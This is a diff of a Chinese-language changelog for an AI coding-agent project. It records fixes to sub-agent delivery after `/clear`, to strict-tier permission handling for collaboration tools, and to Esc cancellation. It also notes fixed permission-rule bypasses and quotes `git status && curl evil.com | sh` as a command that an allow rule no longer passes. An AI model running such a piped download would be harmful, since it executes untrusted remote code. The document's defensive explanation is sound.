@@ -72,9 +72,31 @@
   **诚实、不静默失效**。这条边界仍长期登记在 `CLAUDE.md`「已知后续工程项」
   第 15 条末尾，将来真有需求时从那里重新立项、走完整 `/spec`。
 
+## 顺带修掉的（不是 todo 项，但与上面几条同期）
+
+**做 todo 时用真实模型验收顺带撞到的产品缺陷。** 记在这里是因为它们改变了
+现有行为，而看 todo 历史的人有理由问「这是什么时候变的」——但它们从来不是
+待选方向，所以不进上面那张清单。完整的现场、机制与复验都在
+[`docs/c15/acceptance/live-model.md`](../c15/acceptance/live-model.md)。
+
+- **`/clear` 之后上一段对话的子 Agent 结论仍会流进新对话**（PR #29）。
+  `take_deliverables` 的判据是「终态且未交付」，不区分属于哪一段对话；
+  而 C15 的待命队员让这条路径成了**常态**（清空会唤醒它们让线程退出，
+  那恰好把它们变成「终态且未交付」）。修法是给任务表加**会话代**，
+  创建时盖章、交付只认当前代。⚠ 刻意不是「切换时标一遍」——取消是异步的。
+- **`system_serial` 工具在严格档下被整个关掉**（PR #30）。
+  它是上一条 `perm-system-serial-bypass` 的副作用：只降级 ASK 的话，
+  严格档下④层给的 DENY 会把委派、Skill 加载与全部协作能力一次性关掉。
+  修法是**对第④层整层免疫**，①②③与 Hook 一字不动。
+  想关掉它们仍然写 `deny: send_message`（③层）；**`/perm 严格` 不是这个用途**。
+
+⚠ **两条都是单测抓不到、只有真机跑才现形的**：前者落在「先跑子 Agent →
+`/clear` → 再提问」的接缝上（各段都验过、接缝没有），后者要让一个**严格档
+角色**真的去调协作工具才会暴露。这与 C11/C13/C14/C15 历次验收的教训同型。
+
 ## 已完成（已从本文件夹移除）
 
-- ~~`Esc` 不取消正在跑的子 Agent~~ —— `subagent-cancel-semantics` 分支，
+- ~~`Esc` 不取消正在跑的子 Agent~~ —— `subagent-cancel-semantics` 分支，PR #27，
   按用户拍板的**方案 A** 实现：**语义一字未改**（`Esc` 仍然只停主对话，
   C13「委派永不阻塞」的契约原样成立），只是按下时会明确告诉用户
   「仍有 N 个子 Agent 在后台运行，用 `/agents cancel all` 停止」。
@@ -85,7 +107,7 @@
   护栏四条，含两个方向的反证：条数照实、零个不提示、
   以及「`Esc` 之后子 Agent 仍在跑」——最后那条同时钉住了方案 A 的语义，
   哪天有人改成方案 B（连带取消）它会红，那不是回归而是语义变更。
-- ~~子 Agent 端到端的时间断言偶发红~~ —— `subagent-e2e-timing-flaky` 分支。
+- ~~子 Agent 端到端的时间断言偶发红~~ —— `subagent-e2e-timing-flaky` 分支，PR #26。
   **产品代码零改动**，问题全在测试侧，但根因有两个而不是一个：
   ① 判据用挂钟时间（`assertLess(elapsed, 0.12)`），改成事件同步后判的是
   **顺序**（「主对话返回时子 Agent 还没跑完」）而非速度；
@@ -95,12 +117,15 @@
   另把反证写成常驻用例（`test_foreground_waits_for_the_subagent`，
   同判据反结论），因为「改坏产品看它红不红」是一次性动作、做完就没了。
   详见 `docs/internals/testing.md` 的「不要用挂钟时间做判据」。
-
 - ~~`system_serial` 的工具绕过③规则层~~ + ~~allow 的末尾通配跨分隔符~~ ——
   `perm-system-serial-bypass` 分支，**两条一起做、一起评审**（都在③规则层上）。
   兑现了 CLAUDE.md 已知项 #18 与 #12 的 allow 半边：
   ① 七个 `system_serial` 工具现在照常过 `engine.decide`，`deny: run_agent` 真的
   生效了，但**判 ASK 时按 ALLOW 处理**以保住「不弹面板」这条既有性质；
+  ⚠ **这半句已被 PR #30 取代**——现在是「**对第④层整层免疫**」（ASK 与 DENY
+  都按放行）。只降级 ASK 会让严格档把这七个工具全关掉，而那**没人打算要**：
+  内置 `explorer` / `planner` 声明 `strict`，实测它们一个协作工具都用不了。
+  当前行为以 `CLAUDE.md` 已知项 #18 为准；
   ② allow 命令规则改为「每一段都得命中」，`allow: Bash(git *)` 不再整串放行
   `git status && curl evil.com | sh`。
   两条评审决定：allow 侧单用**认引号**的拆分（收紧侧逐字不变，否则等于放宽①黑名单）、
@@ -117,9 +142,9 @@
 - ~~保留区与余量随窗口缩放~~ —— `maintenance-1` 分支，已知项 #8
 - ~~Plan Mode 规划阶段工具阶段强校验~~ —— `maintenance-1` 分支，已知项 #2
 - ~~CLAUDE.md 测试章精简~~ —— `maintenance-1` 分支
-- ~~网络访问工具~~ —— `web-tool` 分支，走完整 /spec 流程（五轮独立审查、七轮修订），文档留在 `docs/extensions/web-fetch/`，兑现了 CLAUDE.md 已知项 #5 的「网络请求限制」。**它的另一半（web_search）已登记为本清单第 5 条**
+- ~~网络访问工具~~ —— `web-tool` 分支，走完整 /spec 流程（五轮独立审查、七轮修订），文档留在 `docs/extensions/web-fetch/`，兑现了 CLAUDE.md 已知项 #5 的「网络请求限制」。**它的另一半（web_search）已登记为本清单第 1 条**
 - ~~C15 子 Agent 协作~~ —— `c15` 分支，PR #20 已合并进 main。走完整 /spec 流程，
   真实模型验收抓出 **6 个产品问题**（全部已修）。两个未修的遗留里，
   「allow 通配跨分隔符」已随 `perm-system-serial-bypass` 修完，
-  「模型不会主动组队」是本清单第 4 条。文档在 `docs/c15/`，验收记录在 `docs/c15/acceptance/live-model.md`
+  「模型不会主动组队」是本清单第 3 条。文档在 `docs/c15/`，验收记录在 `docs/c15/acceptance/live-model.md`
 - ~~Skill 作者期~~ —— `skill-authoring` 分支，走完整 /spec 流程（一轮独立审查，查出两条阻塞：预授权过宽判定对 MCP 工具必然误报且**给出的改法会静默破坏用户配置**、以及 spec 一度承诺的「创建到用户级」被第②层沙箱物理挡死）。文档留在 `docs/extensions/skill-authoring/`。它是**唯一由真实使用暴露**的缺口——此前 C11 的 43/43 判据全部建立在「已经有一份写好的 Skill」这个前提上
